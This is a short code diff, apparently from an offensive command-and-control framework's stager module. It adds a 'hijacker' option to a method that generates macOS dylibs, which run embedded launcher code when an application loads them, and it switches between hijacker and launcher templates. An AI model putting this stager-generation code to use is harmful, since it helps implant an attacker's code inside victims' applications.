@@ -343,17 +343,24 @@ class Stagers:
         else:
             print helpers.color("[!] Unable to patch MachO binary")
 
-    def generate_dylib(self, launcherCode, arch):
+    def generate_dylib(self, launcherCode, arch, hijacker):
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
         import macholib.MachO
 
         MH_DYLIB = 6
-        if arch == 'x86':
-            f = open(self.installPath + "/data/misc/template.dylib", "rb")
+        if hijacker.lower() == 'true':
+            if arch == 'x86':
+                f = open(self.installPath + "/data/misc/hijackers/template.dylib", "rb")
+            else:
+                f = open(self.installPath + "/data/misc/hijackers/template64.dylib", "rb")
         else:
-            f = open(self.installPath + "/data/misc/template64.dylib", "rb")
+            if arch == 'x86':
+                f = open(self.installPath + "/data/misc/templateLauncher.dylib", "rb")
+            else:
+                f = open(self.installPath + "/data/misc/templateLauncher64.dylib", "rb")
+        
         macho = macholib.MachO.MachO(f.name)
 
         if int(macho.headers[0].header.filetype) != MH_DYLIB:
